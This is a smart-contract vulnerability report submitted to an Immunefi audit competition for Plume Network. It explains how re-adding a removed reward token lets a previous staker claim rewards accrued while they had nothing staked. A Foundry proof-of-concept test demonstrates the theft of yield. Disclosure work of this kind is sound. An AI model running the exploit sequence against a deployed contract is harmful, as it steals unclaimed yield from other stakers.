# 50519 sc high rewardsfacet reintroducing an old reward token will result in wrong accounting leading to theft of yield

**Submitted on Jul 25th 2025 at 16:40:46 UTC by @max10afternoon for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #50519
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/RewardsFacet.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

Reintroducing an old reward token will result in wrong accounting, leading to theft of yield.

NB. Notes on access control and limitations will be addressed in the "Access control & limitations" section of the report

## Vulnerability Details

When staking on an empty account, only the userValidatorRewardPerTokenPaid, userValidatorRewardPerTokenPaidTimestamp and validatorRewardPerTokenCumulative variable of currently available reward tokens will be upgraded, and not the historical ones, as can be seen by the two functions involved \_initializeRewardStateForNewStake and updateRewardPerTokenForValidator

```
    function _initializeRewardStateForNewStake(address user, uint16 validatorId) internal {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

        $.userValidatorStakeStartTime[user][validatorId] = block.timestamp;

        address[] memory rewardTokens = $.rewardTokens;
        for (uint256 i = 0; i < rewardTokens.length; i++) {
            address token = rewardTokens[i];
            if ($.isRewardToken[token]) {
                PlumeRewardLogic.updateRewardPerTokenForValidator($, token, validatorId);

                $.userValidatorRewardPerTokenPaid[user][validatorId][token] =
                    $.validatorRewardPerTokenCumulative[validatorId][token];
                $.userValidatorRewardPerTokenPaidTimestamp[user][validatorId][token] = block.timestamp;
            }
        }
    }
```

```
function updateRewardPerTokenForValidator(
        PlumeStakingStorage.Layout storage $,
        address token,
        uint16 validatorId
    ) internal {
        PlumeStakingStorage.ValidatorInfo storage validator = $.validators[validatorId]; // Get validator info

        // --- REORDERED SLASHED/INACTIVE CHECKS ---
        // Check for slashed state FIRST since slashed validators are also inactive
        if (validator.slashed) {
            // For slashed validators, no further rewards or commission accrue.
            // We just update the timestamp to the current time to mark that the state is "settled" up to now.
            $.validatorLastUpdateTimes[validatorId][token] = block.timestamp;

            // Add a defensive check: A slashed validator should never have any stake. If it does, something is
            // wrong with the slashing logic itself.
            if ($.validatorTotalStaked[validatorId] > 0) {
                revert InternalInconsistency("Slashed validator has non-zero totalStaked");
            }
            return;
        } else if (!validator.active) {
            // For inactive (but not slashed) validators, no further rewards or commission accrue.
            // We just update the timestamp to the current time to mark that the state is "settled" up to now.
            $.validatorLastUpdateTimes[validatorId][token] = block.timestamp;
            return;
        }
        // --- END REORDERED CHECKS ---

        uint256 totalStaked = $.validatorTotalStaked[validatorId];
        uint256 oldLastUpdateTime = $.validatorLastUpdateTimes[validatorId][token];

        if (block.timestamp > oldLastUpdateTime) {
            if (totalStaked > 0) {
                uint256 timeDelta = block.timestamp - oldLastUpdateTime;
                // Get the reward rate effective for the segment ending at block.timestamp
                PlumeStakingStorage.RateCheckpoint memory effectiveRewardRateChk =
                    getEffectiveRewardRateAt($, token, validatorId, block.timestamp);
                uint256 effectiveRewardRate = effectiveRewardRateChk.rate;

                if (effectiveRewardRate > 0) {
                    uint256 rewardPerTokenIncrease = timeDelta * effectiveRewardRate;
                    $.validatorRewardPerTokenCumulative[validatorId][token] += rewardPerTokenIncrease;

                    // Accrue commission for the validator for this segment
                    // The commission rate should be the one effective at the START of this segment (oldLastUpdateTime)
                    uint256 commissionRateForSegment = getEffectiveCommissionRateAt($, validatorId, oldLastUpdateTime);
                    uint256 grossRewardForValidatorThisSegment =
                        (totalStaked * rewardPerTokenIncrease) / PlumeStakingStorage.REWARD_PRECISION;

                    // Use regular division (floor) for validator's accrued commission
                    uint256 commissionDeltaForValidator = (
                        grossRewardForValidatorThisSegment * commissionRateForSegment
                    ) / PlumeStakingStorage.REWARD_PRECISION;

                    if (commissionDeltaForValidator > 0) {
                        $.validatorAccruedCommission[validatorId][token] += commissionDeltaForValidator;
                    }
                }
            }
        }
        // Update last global update time for this validator/token AFTER all calculations for the segment
        $.validatorLastUpdateTimes[validatorId][token] = block.timestamp;
    }
```

The validatorRewardPerTokenCumulative variable in particular will be update in updateRewardPerTokenForValidator, whenever updating the rewards for a particular token validator couple.

This two things combined will result in an incorrect reward distribution: in fact, if a user stakes after the reward token has been removed, their userValidatorRewardPerTokenPaidTimestamp variable will not be updated, while the token validator couple will still hold the old validatorRewardPerTokenCumulative variable. This means that if they claim after the reward tokens gets reintroduced, the user will receive all the rewards belonging to the check points, between their last complete unstake and the token removal, accruing rewards that happened after a full unstake, resulting in a theft of yield (this can be done maliciously or by accident).

### Access control & limitations

In order for this to be possible the user must have staked some amount of tokens in the past with the validator, it is NOT necessary for the user to hold those stake assets at the time of the attack or to leave them in the contract for more than one block, as the stake action must be performed on an empty stakeInfo, it's just necessary for the userValidatorRewardPerTokenPaidTimestamp variable to be different than 0 to avoid a safety check in \_calculateRewardsCore.

Although adding and removing reward tokens is an administrative action, the issue will NOT arise form a reckless or malicious behavior by the admins, but will also happen under a regular and safe use of the contract and administrative privileges. This is highlighted by the fact that the the addRewardToken functions has safety checks dedicated to the possibility of reintroducing a reward token

```
        // Prevent re-adding a token in the same block it was removed to avoid checkpoint overwrites.
        if ($.tokenRemovalTimestamps[token] == block.timestamp) {
            revert CannotReAddTokenInSameBlock(token);
        }
```

Also this report concerns the action that a PERMISSIONLESS user can do around a privileged action maliciously (by frontrunning it) or by accident.

The issue will arise only if there are existing legacy check points. Although it exist a functionality to remove such checkpoints, this will not always be usable as it can lead to user's rewards being permanently frozen in the contract or until an update, leading to an issue of equivalent severity (Temporary freezing of funds for at least 24 hours), as any rewards that haven't been computed yet by users, belonging to such checkpoints will be lost (as highlighted in multiple comments of similar functions, and the function it self).

## Impact Details

Theft of unclaimed yield: A user will be able to get access to the yield generated from all the legacy checkpoints, that were active while they had 0 assets staked in the contract, resulting in a theft of yield.

## Proof of Concept

As highlighted in the 'Access control & limitations' section this report is focused on the interaction that a permissionless user can have with a safe and reasonable use of administrative functions. Therefor the coded PoC will make use of such functions, that does not mean that privileged access is required to exploit the issue.

To run the script copy it inside the /attackathon-plume-network/plume/test folder

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import { StdCheats } from "forge-std/StdCheats.sol";
import { Test, console2 } from "forge-std/Test.sol";

// Diamond Proxy & Storage
import { PlumeStaking } from "../src/PlumeStaking.sol";
import { PlumeStakingStorage } from "../src/lib/PlumeStakingStorage.sol";

// Custom Facet Contracts
import { AccessControlFacet } from "../src/facets/AccessControlFacet.sol";
import { ManagementFacet } from "../src/facets/ManagementFacet.sol";
import { RewardsFacet } from "../src/facets/RewardsFacet.sol";
import { StakingFacet } from "../src/facets/StakingFacet.sol";
import { ValidatorFacet } from "../src/facets/ValidatorFacet.sol";
import { IAccessControl } from "../src/interfaces/IAccessControl.sol";
import { IPlumeStakingRewardTreasury } from "../src/interfaces/IPlumeStakingRewardTreasury.sol";

// SolidState Diamond Interface & Cut Interface
import { IERC2535DiamondCutInternal } from "@solidstate/interfaces/IERC2535DiamondCutInternal.sol";
import { ISolidStateDiamond } from "@solidstate/proxy/diamond/ISolidStateDiamond.sol";

// Libs & Errors/Events
import { NoRewardsToRestake, NotValidatorAdmin, Unauthorized } from "../src/lib/PlumeErrors.sol";
import "../src/lib/PlumeErrors.sol";
import "../src/lib/PlumeEvents.sol";

import { PlumeRewardLogic } from "../src/lib/PlumeRewardLogic.sol";
import { PlumeRoles } from "../src/lib/PlumeRoles.sol"; // Needed for REWARD_PRECISION

// OZ Contracts
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// Treasury Proxy
import { PlumeStakingRewardTreasury } from "../src/PlumeStakingRewardTreasury.sol";
import { PlumeStakingRewardTreasuryProxy } from "../src/proxy/PlumeStakingRewardTreasuryProxy.sol";

contract PlumeStakingStressTest is Test {


    address public user1;
    address public user2;
    address public user3;
    address public user4;
    address public admin;
    address public alice;
    address public bob;
    address public charlie;
    address public dave;
    address public validatorAdmin;

    // Diamond Proxy Address
    PlumeStaking internal diamondProxy;
    PlumeStakingRewardTreasury public treasury;

    // Addresses
    address public constant ADMIN_ADDRESS = 0xC0A7a3AD0e5A53cEF42AB622381D0b27969c4ab5;
    address payable public constant PLUME_NATIVE = payable(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE); // Payable for
    // treasury funding


    // Constants
    uint256 public constant MIN_STAKE = 1e17; // 0.1 PLUME for stress testing
    uint256 public constant INITIAL_COOLDOWN = 7 days; // Keep real cooldown
    uint16 public constant NUM_VALIDATORS = 15;
    uint256 public constant VALIDATOR_COMMISSION = 0.005 * 1e18; // 0.5% scaled by 1e18
    // Approx 5% APR for PLUME rewards per second = (0.05 * 1e18) / (365 days * 24 hours * 60 mins * 60 secs)
    uint256 public constant PLUME_REWARD_RATE_PER_SECOND = 1_585_489_599; // ~5% APR (5e16 / 31536000)

    // Test parameters
    uint256 constant MAX_RANDOM_STAKE_AMOUNT = 5 ether; // Max amount for a single random stake action
    uint256 constant TEST_STAKER_INITIAL_BALANCE = 100 ether; // Ensure test staker has plenty of funds
    uint256 constant GAS_TEST_NUM_ACTIONS = 100; // Number of actions to measure gas for

    // Cost calculation parameters (adjust as needed)
    uint256 constant ETH_PRICE_USD = 3500; // Example ETH price
    uint256 constant L2_GAS_PRICE_GWEI = 0.001 * 1e9; // Example L2 gas price (0.001 Gwei) - SCALE BY 1e9 for wei

    // Unique address for the staker whose actions we measure
    address constant TEST_STAKER = address(0xBADBADBAD);

    function setUp() public {
        console2.log("Starting Stress Test setup");

        admin = ADMIN_ADDRESS;
        vm.deal(admin, 10_000 ether); // Ensure admin has funds

        vm.startPrank(admin);

        // 1. Deploy Diamond Proxy
        diamondProxy = new PlumeStaking();
        assertEq(
            ISolidStateDiamond(payable(address(diamondProxy))).owner(), admin, "Deployer should be owner initially"
        );

        // 2. Deploy Custom Facets
        AccessControlFacet accessControlFacet = new AccessControlFacet();
        StakingFacet stakingFacet = new StakingFacet();
        RewardsFacet rewardsFacet = new RewardsFacet();
        ValidatorFacet validatorFacet = new ValidatorFacet();
        ManagementFacet managementFacet = new ManagementFacet();

        // 3. Prepare Diamond Cut
        IERC2535DiamondCutInternal.FacetCut[] memory cut = new IERC2535DiamondCutInternal.FacetCut[](5);

        // --- Get Selectors (using helper or manual list) ---
        bytes4[] memory accessControlSigs = new bytes4[](7);
        accessControlSigs[0] = AccessControlFacet.initializeAccessControl.selector;
        accessControlSigs[1] = IAccessControl.hasRole.selector;
        accessControlSigs[2] = IAccessControl.getRoleAdmin.selector;
        accessControlSigs[3] = IAccessControl.grantRole.selector;
        accessControlSigs[4] = IAccessControl.revokeRole.selector;
        accessControlSigs[5] = IAccessControl.renounceRole.selector;
        accessControlSigs[6] = IAccessControl.setRoleAdmin.selector;

        bytes4[] memory stakingSigs = new bytes4[](13);
        stakingSigs[0] = StakingFacet.stake.selector;
        stakingSigs[1] = StakingFacet.restake.selector;
        stakingSigs[2] = bytes4(keccak256("unstake(uint16)"));
        stakingSigs[3] = bytes4(keccak256("unstake(uint16,uint256)"));
        stakingSigs[4] = StakingFacet.withdraw.selector;
        stakingSigs[5] = StakingFacet.stakeOnBehalf.selector;
        stakingSigs[6] = StakingFacet.stakeInfo.selector;
        stakingSigs[7] = StakingFacet.amountStaked.selector;
        stakingSigs[8] = StakingFacet.amountCooling.selector;
        stakingSigs[9] = StakingFacet.amountWithdrawable.selector;
        //stakingSigs[10] = StakingFacet.cooldownEndDate.selector;
        stakingSigs[10] = StakingFacet.getUserValidatorStake.selector;
        stakingSigs[11] = StakingFacet.restakeRewards.selector;
        stakingSigs[12] = StakingFacet.totalAmountStaked.selector;

        bytes4[] memory rewardsSigs = new bytes4[](15);
        rewardsSigs[0] = RewardsFacet.addRewardToken.selector;
        rewardsSigs[1] = RewardsFacet.removeRewardToken.selector;
        rewardsSigs[2] = RewardsFacet.setRewardRates.selector;
        rewardsSigs[3] = RewardsFacet.setMaxRewardRate.selector;
        rewardsSigs[4] = bytes4(keccak256("claim(address)"));
        rewardsSigs[5] = bytes4(keccak256("claim(address,uint16)"));
        rewardsSigs[6] = RewardsFacet.claimAll.selector;
        rewardsSigs[7] = RewardsFacet.earned.selector;
        rewardsSigs[8] = RewardsFacet.getClaimableReward.selector;
        rewardsSigs[9] = RewardsFacet.getRewardTokens.selector;
        rewardsSigs[10] = RewardsFacet.getMaxRewardRate.selector;
        rewardsSigs[11] = RewardsFacet.tokenRewardInfo.selector;
        rewardsSigs[12] = RewardsFacet.setTreasury.selector;
        rewardsSigs[13] = RewardsFacet.getPendingRewardForValidator.selector;

        bytes4[] memory validatorSigs = new bytes4[](14);
        validatorSigs[0] = ValidatorFacet.addValidator.selector;
        validatorSigs[1] = ValidatorFacet.setValidatorCapacity.selector;
        validatorSigs[2] = ValidatorFacet.setValidatorCommission.selector;
        validatorSigs[3] = ValidatorFacet.setValidatorAddresses.selector;
        validatorSigs[4] = ValidatorFacet.setValidatorStatus.selector;
        validatorSigs[5] = ValidatorFacet.getValidatorInfo.selector;
        validatorSigs[6] = ValidatorFacet.getValidatorStats.selector;
        validatorSigs[7] = ValidatorFacet.getUserValidators.selector;
        validatorSigs[8] = ValidatorFacet.getAccruedCommission.selector;
        validatorSigs[9] = ValidatorFacet.getValidatorsList.selector;
        validatorSigs[10] = ValidatorFacet.getActiveValidatorCount.selector;
        validatorSigs[11] = ValidatorFacet.requestCommissionClaim.selector;
        validatorSigs[12] = ValidatorFacet.voteToSlashValidator.selector;
        validatorSigs[13] = ValidatorFacet.slashValidator.selector;

        bytes4[] memory managementSigs = new bytes4[](6); // Size reduced from 7 to 6
        managementSigs[0] = ManagementFacet.setMinStakeAmount.selector;
        managementSigs[1] = ManagementFacet.setCooldownInterval.selector;
        managementSigs[2] = ManagementFacet.adminWithdraw.selector;
        managementSigs[3] = ManagementFacet.getMinStakeAmount.selector; // Index shifted from 4
        managementSigs[4] = ManagementFacet.getCooldownInterval.selector; // Index shifted from 5
        managementSigs[5] = ManagementFacet.setMaxSlashVoteDuration.selector; // Index shifted from 6

        // Define the Facet Cuts
        cut[0] = IERC2535DiamondCutInternal.FacetCut({
            target: address(accessControlFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: accessControlSigs
        });
        cut[1] = IERC2535DiamondCutInternal.FacetCut({
            target: address(managementFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: managementSigs
        });
        cut[2] = IERC2535DiamondCutInternal.FacetCut({
            target: address(stakingFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: stakingSigs
        });
        cut[3] = IERC2535DiamondCutInternal.FacetCut({
            target: address(validatorFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: validatorSigs
        });
        cut[4] = IERC2535DiamondCutInternal.FacetCut({
            target: address(rewardsFacet),
            action: IERC2535DiamondCutInternal.FacetCutAction.ADD,
            selectors: rewardsSigs
        });

        // 4. Execute Diamond Cut
        ISolidStateDiamond(payable(address(diamondProxy))).diamondCut(cut, address(0), "");
        console2.log("Diamond cut applied.");

        // 5. Initialize
        diamondProxy.initializePlume(
            address(0),
            MIN_STAKE,
            INITIAL_COOLDOWN,
            1 days, // maxSlashVoteDuration
            50e16 // maxAllowedValidatorCommission (50%)
        );
        AccessControlFacet(address(diamondProxy)).initializeAccessControl();
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.ADMIN_ROLE, admin);
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.VALIDATOR_ROLE, admin);
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.REWARD_MANAGER_ROLE, admin); // Grant reward
            // manager
        AccessControlFacet(address(diamondProxy)).grantRole(PlumeRoles.TIMELOCK_ROLE, admin);
        console2.log("Diamond initialized.");

        // 6. Deploy and setup reward treasury
        PlumeStakingRewardTreasury treasuryImpl = new PlumeStakingRewardTreasury();
        bytes memory initData =
            abi.encodeWithSelector(PlumeStakingRewardTreasury.initialize.selector, admin, address(diamondProxy));
        PlumeStakingRewardTreasuryProxy treasuryProxy =
            new PlumeStakingRewardTreasuryProxy(address(treasuryImpl), initData);
        treasury = PlumeStakingRewardTreasury(payable(address(treasuryProxy)));
        RewardsFacet(address(diamondProxy)).setTreasury(address(treasury));
        console2.log("Treasury deployed and set.");



        // 7. Setup Validators (15)
        uint256 defaultMaxCapacity = 1_000_000_000 ether; // High capacity
        for (uint16 i = 0; i < NUM_VALIDATORS; i++) {
            address valAdmin = vm.addr(uint256(keccak256(abi.encodePacked("validatorAdmin", i))));
            vm.deal(valAdmin, 1 ether); // Give admin some gas money
            ValidatorFacet(address(diamondProxy)).addValidator(
                i,
                VALIDATOR_COMMISSION,
                valAdmin, // Use unique admin
                valAdmin, // Use same address for withdraw for simplicity
                string(abi.encodePacked("l1val", i)),
                string(abi.encodePacked("l1acc", i)),
                vm.addr(uint256(keccak256(abi.encodePacked("l1evm", i)))),
                defaultMaxCapacity
            );
        }
        console2.log("%d validators added.", NUM_VALIDATORS);


        // 8. Add PLUME_NATIVE as the only reward token
        RewardsFacet(address(diamondProxy)).addRewardToken(PLUME_NATIVE, PLUME_REWARD_RATE_PER_SECOND, PLUME_REWARD_RATE_PER_SECOND*2);
        treasury.addRewardToken(PLUME_NATIVE); // Also add to treasury allowed list
        vm.deal(address(treasury), 1_000_000 ether); // Give treasury a large amount of native ETH for rewards
        console2.log("PLUME_NATIVE reward token added and treasury funded.");

        // 9. Set reward rates for PLUME_NATIVE
        address[] memory rewardTokens = new address[](1);
        rewardTokens[0] = PLUME_NATIVE;
        uint256[] memory rates = new uint256[](1);
        rates[0] = PLUME_REWARD_RATE_PER_SECOND;
        // Set Max Rate slightly higher just in case
        RewardsFacet(address(diamondProxy)).setMaxRewardRate(PLUME_NATIVE, PLUME_REWARD_RATE_PER_SECOND * 2);
        RewardsFacet(address(diamondProxy)).setRewardRates(rewardTokens, rates);
        
        console2.log("PLUME reward rate set.");

        vm.stopPrank();
        console2.log("Stress Test setup complete.");



        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        user4 = makeAddr("user4");

        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");
        dave = makeAddr("dave");

        // Fund users with ETH in setUp
        uint256 ethAmount = 1000 ether;
        vm.deal(user1, ethAmount);
        vm.deal(user2, ethAmount);
        vm.deal(user3, ethAmount);
        vm.deal(user4, ethAmount);
        vm.deal(validatorAdmin, ethAmount);

    }


 
    function testRewardToken() public {
        uint256 amount = 100e18;


    //1: USER2 STAKES AND UNSTAKES AT TIME 0 SETTING userValidatorRewardPerTokenPaidTimestamp TO A VALUE DIFFERENT THAN 0
        vm.startPrank(user2);
    
        //Stake
        StakingFacet(address(diamondProxy)).stake{value: MIN_STAKE}( 0);

        // Unstake
        StakingFacet(address(diamondProxy)).unstake(0);

        //User withdraws, but it's not necessary for this particular PoC

        //User2 has nothing staked in the contract
        assertEq(StakingFacet(address(diamondProxy)).totalAmountStaked(), 0);

        vm.stopPrank();

     
        vm.startPrank(user1);
        

    //2: USER1 STAKES AND CLAIM AFTER 7 DAYS, USED JUST FOR REFERENCE
        StakingFacet(address(diamondProxy)).stake{value: amount}(
            0
        );

       
        vm.warp(block.timestamp + INITIAL_COOLDOWN );

        uint256 balanceBefore = user1.balance;
        RewardsFacet(address(diamondProxy)).claim(PLUME_NATIVE);
        uint256 balanceAfter = user1.balance;

        uint256 rewardAccumulatedByUser1AfterOneWeek = balanceAfter - balanceBefore;

        vm.stopPrank();




    //3: ADMIN SAFELY REMOVES THE TOKEN AS REWARD
        vm.prank(admin);
        RewardsFacet(address(diamondProxy)).removeRewardToken(PLUME_NATIVE);


        vm.warp(block.timestamp + INITIAL_COOLDOWN );


    //4: ADMIN SAFELY REINTRODUCES THE TOKEN AFTER SOME TIMES, ALLOWING USER2 TO STEAL YIELD 
        vm.startPrank(user2);
        
        uint256 timeOfStake = block.timestamp;       
        StakingFacet(address(diamondProxy)).stake{value: amount}(
            0
        );
        vm.stopPrank();

        vm.prank(admin);
        RewardsFacet(address(diamondProxy)).addRewardToken(PLUME_NATIVE, PLUME_REWARD_RATE_PER_SECOND, PLUME_REWARD_RATE_PER_SECOND*2);


        vm.startPrank(user2);
        
        uint256 timeOfclaim = block.timestamp; 
        balanceBefore = user2.balance;
        RewardsFacet(address(diamondProxy)).claim(PLUME_NATIVE);
        balanceAfter = user2.balance;

        uint256 rewardAccumulatedByUser2AfterZeroSeconds = balanceAfter - balanceBefore;

        vm.stopPrank();

    //5: AFTER 0 SECONDS USER2 WAS ABLE TO ACCUMULATE 1 WEEK WORTH OF REWARDS
        assertEq(timeOfStake, timeOfclaim);
        assertEq(rewardAccumulatedByUser2AfterZeroSeconds, rewardAccumulatedByUser1AfterOneWeek);
    }


} // End Contract
```
